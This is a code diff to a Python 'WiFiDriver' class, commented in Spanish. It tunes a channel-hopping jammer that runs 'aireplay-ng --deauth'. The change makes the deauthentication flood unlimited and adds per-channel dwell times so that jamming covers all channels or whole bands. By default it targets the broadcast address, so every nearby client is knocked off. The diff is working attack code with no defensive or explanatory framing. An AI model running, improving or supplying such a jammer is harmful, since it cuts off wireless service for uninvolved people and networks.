@@ -918,14 +918,23 @@ class WiFiDriver:
                         continue
                 
                 try:
-                    time.sleep(0.1)  # Pequeña pausa para cambio de canal
+                    time.sleep(0.2)  # Pausa para cambio de canal
                     
-                    # Iniciar deauth en este canal
-                    cmd = ['sudo', 'aireplay-ng', '--deauth', '5', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                    # Iniciar deauth en este canal con más paquetes y tiempo
+                    # Usar 0 para infinito, pero limitar tiempo de ejecución
+                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     
-                    # Esperar un poco antes de cambiar de canal
-                    time.sleep(0.3)
+                    # Esperar más tiempo en cada canal para que sea efectivo
+                    # Para "all", usar menos tiempo por canal para cubrir más rápido
+                    if jam_mode == "all":
+                        wait_time = 0.8  # 0.8 segundos por canal cuando son muchos
+                    elif jam_mode in ["band_2_4", "band_5"]:
+                        wait_time = 1.2  # 1.2 segundos por canal cuando es una banda
+                    else:
+                        wait_time = 1.5  # 1.5 segundos por canal por defecto
+                    
+                    time.sleep(wait_time)
                     
                     # Terminar proceso antes de cambiar de canal
                     try:
